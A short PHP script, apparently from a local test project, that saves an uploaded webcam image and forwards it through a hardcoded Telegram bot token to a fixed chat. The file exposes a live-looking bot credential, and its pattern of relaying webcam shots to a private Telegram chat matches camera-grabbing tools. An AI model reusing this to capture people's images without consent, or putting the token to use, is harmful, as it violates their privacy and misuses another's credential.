<?php

$nama_file = time().'.jpg';
$direktori = 'uploads/';
$target = $direktori.$nama_file;

move_uploaded_file($_FILES['webcam']['tmp_name'], $target);
function apiRequestMedia($method, $idchat, $data) {
 $chat_id = 238563261;
 $bot_url = 'https://api.telegram.org/bot707671406:AAGp1kszeV2VjTvc591xzaP2t4erWntsW9s/';
 $url = $bot_url.$method."?chat_id=".$chat_id;
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-Type:multipart/form-data"));
 curl_setopt($ch, CURLOPT_URL, $url); 
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
 curl_setopt($ch, CURLOPT_POSTFIELDS, $data); 
 $output = curl_exec($ch);
}

$address = "D:/xampp/htdocs/tescode/webcam/uploads/".$nama_file;
$post_fields = array('caption'=>$nama_file,'photo'=> new CURLFile(realpath($address)));

apiRequestMedia("sendPhoto", 238563261, $post_fields);
?>